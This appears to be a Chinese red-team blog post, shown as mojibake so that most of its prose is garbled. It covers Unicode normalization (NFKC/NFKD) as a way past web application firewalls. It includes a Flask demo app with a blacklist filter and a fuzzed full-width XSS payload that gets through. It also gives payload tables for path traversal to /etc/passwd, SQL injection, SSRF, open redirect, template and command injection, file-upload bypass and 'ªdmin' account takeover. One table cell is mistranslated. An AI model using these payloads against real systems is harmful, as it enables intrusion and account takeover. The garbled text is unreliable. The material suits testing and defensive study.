#  åˆ©ç”¨unicodeç‰¹æ€§åœ¨çº¢é˜Ÿä¸­çš„åº”ç”¨

è‰¯è¾°  [ çº¢é˜Ÿç¬”è®°å½• ](javascript:void\(0\);)

**çº¢é˜Ÿç¬”è®°å½•** ![]()

å¾®ä¿¡å· gh_0162f0882c95

åŠŸèƒ½ä»‹ç» åˆ†äº«å„ç§çº¢é˜Ÿæ”»å‡»æ‰‹æ³•ï¼Œå†…ç½‘æ¸—é€ï¼Œä»£ç å®¡è®¡ï¼Œå·¥å…·å¼€å‘ï¼Œå…¬å¼€æ¼æ´æµ‹è¯•ç­‰å†…å®¹

____

___å‘è¡¨äº_

æ”¶å½•äºåˆé›†

##waf 1 ä¸ª

#æ¸—é€æµ‹è¯• 18 ä¸ª

##ä¾¦å¯Ÿ 2 ä¸ª

#ä¿¡æ¯æ”¶é›† 2 ä¸ª

Unicode å…¼å®¹æ€§æ˜¯Unicode
ç­‰æ•ˆçš„ä¸€ç§å½¢å¼ï¼Œå®ƒç¡®ä¿åœ¨å¯èƒ½å…·æœ‰ä¸åŒè§†è§‰å¤–è§‚æˆ–è¡Œä¸ºçš„å­—ç¬¦æˆ–å­—ç¬¦åºåˆ—ä¹‹é—´è¡¨ç¤ºç›¸åŒçš„æŠ½è±¡å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œğ•ƒè¢«æ ‡å‡†åŒ–ä¸ºLã€‚æ­¤è¡Œä¸ºå¯èƒ½ä¼šä¸ºæ»¥ç”¨ä¸€äº›åœ¨è¾“å…¥æ¸…ç†åæ‰§è¡Œ
unicode å…¼å®¹æ€§çš„å¼±å®ç°æ‰“å¼€å¤§é—¨ã€‚  

##  **Unicode å…¼å®¹å½¢å¼**

##

  

æœ‰å››ç§æ ‡å‡†æ ‡å‡†åŒ–å½¢å¼ï¼š

  * NFCï¼šæ ‡å‡†åŒ–å½¢å¼è§„èŒƒç»„åˆ

  * NFDï¼šè§„èŒƒåŒ–å½¢å¼è§„èŒƒåˆ†è§£

  * NFKCï¼šæ ‡å‡†åŒ–å½¢å¼å…¼å®¹æ€§ç»„åˆ

  * NFKDï¼šè§„èŒƒåŒ–å½¢å¼å…¼å®¹æ€§åˆ†è§£

  

![](https://gitee.com/fuli009/images/raw/master/public/20230714175735.png)

  

 **NFKC** å’Œ **NKFD** å¾ˆæœ‰è¶£ï¼Œå› ä¸ºå®ƒä»¬å…·æœ‰ _å…¼å®¹æ€§_ ï¼Œä¸ºäº†æ£€æŸ¥è¿™ç§è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ª Python ç‰‡æ®µï¼š

  *   *   *   *   *   * 

    
    
    import unicodedatastring = "ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒ"print ('NFC: ' + unicodedata.normalize('NFC', string))print ('NFD: ' + unicodedata.normalize('NFD', string))print ('NFKC: ' + unicodedata.normalize('NFKC', string))print ('NFKD: ' + unicodedata.normalize('NFKD', string)

è¾“å‡ºï¼š

  *   *   *   * 

    
    
    NFC: ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒNFD: ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒNFKC: LeonishanNFKD: Leonishan

  

 **wafç»•è¿‡**  

æˆ‘ä»¬å…ˆåˆ›å»ºç®€å•çš„webåº”ç”¨ç¨‹åºï¼Œå¦‚æœwafæœªæ£€æµ‹åˆ°å¥‡ç‰¹å­—ç¬¦ï¼Œç¨‹åºä¼šåæ˜ å‚æ•°ç»™å‡ºåç§°

ä»£ç 

  

server.py

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    from flask import Flask, abort, requestimport unicodedatafrom waf import waf  
      
    app = Flask(__name__)  
      
      
      
    @app.route('/')def Welcome_name():  name = request.args.get('name')  
      
      
      
      if waf(name):    abort(403, description="XSS Detected")  else:    name = unicodedata.normalize('NFKD', name) #NFC, NFKC, NFD, and NFKD    return 'Test XSS: ' + name  
      
    if __name__ == '__main__':  app.run(port=81)

å¦‚æœæ£€æµ‹åˆ°æŸäº›ä¸å¸¸è§çš„å­—ç¬¦ï¼Œæ­¤åº”ç”¨ç¨‹åºä¼šåŠ è½½ä»¥ä¸‹â€œWAFâ€ä»¥ä¸­æ­¢è¿æ¥ï¼š

waf.py

  *   *   *   *   *   *   * 

    
    
    def waf(input):    print(input)    blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","_","+","=","{","}","]","[","|","\",",".","/","?",";",":",""",""","<",">"]    vuln_detected = False    if any(string in input for string in blacklist):         vuln_detected = True    return vuln_detected

  

å› æ­¤ï¼ŒæŸäº›å…·æœ‰ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ ( <img src=p onerror='prompt(1)'>) çš„è¯·æ±‚å°†è¢«ä¸­æ­¢

è¯·æ±‚

  * 

    
    
      GET /?name=%3Cimg%20src=p%20onerror=%27prompt(1)%27%3E

ç›´æ¥è¿”å›403  

ä½¿ç”¨è„šæœ¬fuzzï¼Œè·å–åˆ°  

  * 

    
    
    GET /?name=%EF%BC%9Cimg%20src%E2%81%BCp%20onerror%E2%81%BC%EF%BC%87prompt%E2%81%BD1%E2%81%BE%EF%BC%87%EF%B9%A5

è¿”å›200  

![](https://gitee.com/fuli009/images/raw/master/public/20230714175736.png)

 **å¦‚ä½•æŸ¥æ‰¾è¿™äº›å­—ç¬¦å‘¢**

æˆ‘ä»¬å¯ä»¥åˆ°è¿™ä¸ªç½‘ç«™  

https://www.compart.com/en/unicode

å¯ä»¥æœç´¢æŸä¸ªå­—ç¬¦ï¼Œå¹¶æ‰¾åˆ°å…¼å®¹åçš„ç›¸åŒå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ >

![](https://gitee.com/fuli009/images/raw/master/public/20230714175737.png)

  

æ˜¾ç¤ºè¿™ä¸‰ä¸ªå­—ç¬¦ï¼šâ‰®ã€ï¹¤å’Œï¼œã€‚å•å‡»æ¯ä¸ªåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨â€œåˆ†è§£â€éƒ¨åˆ†ä¸­çœ‹åˆ°æŒ‰ä»¥ä¸‹æ–¹å¼æ ‡å‡†åŒ–ï¼š

  * â‰®- <(U+003C) -  â—ŒÌ¸(U+0338)

  * ï¹¤- <(U+003C)

  * ï¼œ- <(U+003C)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥è§’è‰²â‰®å°†æ— æ³•å®ç°æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ï¼Œå› ä¸ºå®ƒä¼šæ³¨å…¥è§’è‰²â—ŒÌ¸ï¼ˆU+0338ï¼‰å¹¶ä¼šç ´åæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚

 **å…¶ä»–æ€è·¯**  

 **ç›®å½•éå†**

  

Character| Payload| After Normalization  
---|---|---  
â€¥ (U+2025)| â€¥/â€¥/â€¥/etc/passwd| ../../../etc/passwd  
ï¸°(U+FE30)| ï¸°/ï¸°/ï¸°/etc/passwd| ../../../etc/passwd  
  
 **sqlæ³¨å…¥  
**

  

Character| Payload| After Normalization  
---|---|---  
ï¼‡(U+FF07)| ï¼‡ or ï¼‡1ï¼‡=ï¼‡1| â€™ or â€˜1â€™=â€™1  
ï¼‚(U+FF02)| ï¼‚ or ï¼‚1ï¼‚=ï¼‚1| â€ or â€œ1â€=â€1  
ï¹£ (U+FE63)| adminï¼‡ï¹£ï¹£| adminâ€™â€“  
  
 **ssrf**

  

Character| Payload| After Normalization  
---|---|---  
â“ª (U+24EA)| â‘ â‘¡â‘¦.â“ª.â“ª.â‘ | 127.0.0.1  
  
 **é‡å®šå‘  
**

  

Character| Payload| After Normalization  
---|---|---  
ã€‚(U+3002)| jlajaraã€‚gitlabã€‚io| jlajara.gitlab.io  
ï¼(U+FF0F)| ï¼ï¼jlajara.gitlab.io| //jlajara.gitlab.io  
  
  

 **xss**

  

Character| Payload| After Normalization  
---|---|---  
ï¼œ(U+FF1C)| ï¼œscript src=aï¼ï¼| ï¼œscript src=a/>  
ï¼‚(U+FF02)| ï¼‚onclick=ï¼‡prompt(1)ï¼‡| â€œonclick=â€™prompt(1)â€™  
  
 **æ¨¡æ¿æ³¨å…¥  
**

  

Character| Payload| After Normalization  
---|---|---  
ï¹›(U+FE5B)| ï¹›ï¹›3+3ï¹œï¹œ| {{3+3}}  
ï¼» (U+FF3B)| ï¼»ï¼»5+5ï¼½ï¼½| [[5+5]]  
  
 **ç³»ç»Ÿå‘½ä»¤æ³¨å…¥  
**

  

Character| Payload| After Normalization  
---|---|---  
ï¼† (U+FF06)| ï¼†ï¼†whoami| &&whoami  
ï½œ (U+FF5C)| ï½œï½œ whoami| ||whoami  
  
 **ä»»æ„æ–‡ä»¶ä¸Šä¼   
**

  

Character| Payload| After Normalization  
---|---|---  
ï½ (U+FF50) Ê° (U+02B0)| test.ï½Ê°ï½| test.php  
  
  

 **é€»è¾‘**

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŸäº›å­—ç¬¦æ³¨å†Œç”¨æˆ·ï¼Œä¹Ÿè®¸æ³¨å†Œè¿‡ç¨‹ä¼šå…è®¸æ³¨å†Œï¼Œå› ä¸ºæ­¤æ­¥éª¤ä¸­çš„ç”¨æˆ·æœªè§„èŒƒåŒ–å¹¶å…è®¸è¯¥å­—ç¬¦ã€‚ä¹‹åï¼Œå‡è®¾åº”ç”¨ç¨‹åºåœ¨æ£€ç´¢ç”¨æˆ·æ•°æ®åæ‰§è¡Œä¸€äº›è§„èŒƒåŒ–ã€‚

1.æ³¨å†ŒÂªdminã€‚æ•°æ®åº“ä¸­æ²¡æœ‰æ¡ç›®ï¼Œæ³¨å†ŒæˆåŠŸã€‚

2\. ç™»å½•Âªdminã€‚åç«¯æ‰§è¡Œæ ‡å‡†åŒ–å¹¶ç»™å‡ºç»“æœadminã€‚

3.è´¦æˆ·æ¥ç®¡ã€‚

  

ç‰¹ç‚¹| æœ‰æ•ˆè½½è·| æ ‡å‡†åŒ–å  
---|---|---  
Âª (U+00AA)| Âªdmin| è¡Œæ”¿  
  
  

  

  

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

